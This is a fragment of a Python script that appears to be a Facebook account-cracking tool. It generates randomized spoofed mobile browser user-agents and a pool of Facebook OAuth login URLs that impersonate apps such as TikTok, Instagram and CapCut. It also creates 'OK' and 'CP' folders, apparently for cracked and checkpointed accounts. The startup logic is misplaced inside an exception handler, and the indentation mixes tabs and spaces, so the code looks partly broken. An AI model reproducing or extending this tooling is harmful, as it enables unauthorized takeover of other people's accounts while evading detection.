	chrome = random.choice(['87.0.4280.101','106.0.5249.126','55.0.2883.91','79.0.3945.116','92.0.4515.159','96.0.4664.45','92.0.4515.131','91.0.4472.101','91.0.4472.120','90.0.4430.91','51.0.2704.91','78.0.3904.108','107.0.5304.54','112.0.5615.48','73.0.3683.90','85.0.4183.127','85.0.4183.101','83.0.4103.106','85.0.4183.101','83.0.4103.106','74.0.3729.157','80.0.3987.162','80.0.3987.149','78.0.3904.108','112.0.0.0','113.0.5672.162','108.0.0.0','88.0.4324.141','92.0.4515.159','104.0.5112.97','61.0.3163.98','114.0.0.0','72.0.3626.76','37.0.0.0','47.0.2526.100','42.0.2311.111','69.0.3497.100'])
	model = random.choice(['SM-G532G Build/MMB29T)','SM-G570F Build/MMB29K)','SM-G610F Build/NRD90M)'])
	firman = f"Mozilla/5.0 (Linux; Android {versi_android}; {model} AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome} Mobile Safari/537.36"
	firzah = random.choice([firman])
	user3.append(firzah)
	
for xd in range(10000):
	firman=random.choice(['https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&cancel_url=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26state%3D%257B%2522fbLoginKey%2522%253A%2522nqyut3hse5c76shttb1f23oyy6n4ri21573r6q1rji63r1sko99e%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252F%2522%257D%26scope%3Demail%26response_type%3Dcode%252Cgranted_scopes%26locale%3Did_ID%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Ddd876e15-df42-426c-ba37-e64947ed1c3b%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%2522nqyut3hse5c76shttb1f23oyy6n4ri21573r6q1rji63r1sko99e%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252F%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','https://m.facebook.com/login.php?skip_api_login=1&api_key=1862952583919182&kid_directed_site=0&app_id=1862952583919182&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv13.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D1862952583919182%26cbt%3D1661739665481%26e2e%3D%257B%2522init%2522%253A1661739665481%257D%26ies%3D0%26sdk%3Dandroid-13.1.0%26sso%3Dchrome_custom_tab%26nonce%3D97fc51ef-8bd0-4e25-a62e-51e08a8f73ae%26scope%3Dopenid%252Cpublic_profile%252C%2Buser_age_range%252C%2Bemail%252C%2Buser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%2522587b1d16-0540-4ffe-b52a-d5b7898493ba%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522otr5nf73r2fahkh1um9l%2522%257D%26code_challenge_method%3DS256%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.ss.android.ugc.trill%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26code_challenge%3DacKUWL8thNGqatvgA6Qde8wpAJmEVvnFwjMnin1jXbE%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D587b1d16-0540-4ffe-b52a-d5b7898493ba%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.ss.android.ugc.trill%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%2522587b1d16-0540-4ffe-b52a-d5b7898493ba%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522otr5nf73r2fahkh1um9l%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','https%3A%2F%2Fm.facebook.com%2Fv3.1%2Fdialog%2Foauth%3Fclient_id%3D3213804762189845%26redirect_uri%3Dhttps%253A%252F%252Fwww.capcut.com%252Fpassport%252Fweb%252Fweb_login_success%26scope%3Demail%26state%3D0053afca3gAToVCgoVPZIGY3NGIxZTM4YjU5Zjg5ZmNkNTkxNWUyZWZmNzMyYjQxoU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFM2SJodHRwczovL3d3dy5jYXBjdXQuY29tL2lkLWlkL2xvZ2luoVTZIDJkNzg1MGFiZmFiODNjNWUxYjU2MGExODBjYzA3YzcwoVcAoUYAolNBAKFVwqJNTMI%25253D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Daf919600-a681-4aeb-a128-05e90339859f%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.capcut.com%2Fpassport%2Fweb%2Fweb_login_success%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D0053afca3gAToVCgoVPZIGY3NGIxZTM4YjU5Zjg5ZmNkNTkxNWUyZWZmNzMyYjQxoU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFM2SJodHRwczovL3d3dy5jYXBjdXQuY29tL2lkLWlkL2xvZ2luoVTZIDJkNzg1MGFiZmFiODNjNWUxYjU2MGExODBjYzA3YzcwoVcAoUYAolNBAKFVwqJNTMI%25253D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr'])
	ling.append(firman)	
	
	firman=random.choice(['https://m.facebook.com/v13.0/dialog/oauth?cct_prefetching=0&client_id=1862952583919182&cbt=1661739665481&e2e=%7B%22init%22%3A1661739665481%7D&ies=0&sdk=android-13.1.0&sso=chrome_custom_tab&nonce=97fc51ef-8bd0-4e25-a62e-51e08a8f73ae&scope=openid%2Cpublic_profile%2C+user_age_range%2C+email%2C+user_friends&state=%7B%220_auth_logger_id%22%3A%22587b1d16-0540-4ffe-b52a-d5b7898493ba%22%2C%223_method%22%3A%22custom_tab%22%2C%227_challenge%22%3A%22otr5nf73r2fahkh1um9l%22%7D&code_challenge_method=S256&default_audience=friends&login_behavior=NATIVE_WITH_FALLBACK&redirect_uri=fbconnect%3A%2F%2Fcct.com.ss.android.ugc.trill&auth_type=rerequest&response_type=id_token%2Ctoken%2Csigned_request%2Cgraph_domain&return_scopes=true&code_challenge=acKUWL8thNGqatvgA6Qde8wpAJmEVvnFwjMnin1jXbE&ret=login&fbapp_pres=0&logger_id=587b1d16-0540-4ffe-b52a-d5b7898493ba&tp=unspecified','https://m.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified','https://m.facebook.com/v3.1/dialog/oauth?client_id=3213804762189845&redirect_uri=https%3A%2F%2Fwww.capcut.com%2Fpassport%2Fweb%2Fweb_login_success&scope=email&state=0053afca3gAToVCgoVPZIGY3NGIxZTM4YjU5Zjg5ZmNkNTkxNWUyZWZmNzMyYjQxoU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFM2SJodHRwczovL3d3dy5jYXBjdXQuY29tL2lkLWlkL2xvZ2luoVTZIDJkNzg1MGFiZmFiODNjNWUxYjU2MGExODBjYzA3YzcwoVcAoUYAolNBAKFVwqJNTMI%253D&ret=login&fbapp_pres=0&logger_id=af919600-a681-4aeb-a128-05e90339859f&tp=unspecified'])
	next.append(firman)	
if __name__=="__main__":
    try:
        os.mkdir('OK')
    except:
        pass
    try:
        os.mkdir('CP')
    except:
        pass
        os.system('git pull')
        #zahra_animasi2(f'\n{xxx}   ({h}mampir bang ke TikTok{xxx})')
        #waktu(3)
        #os.system("xdg-open https://vm.tiktok.com/ZSFkD95KT/")
        log_zar() 
	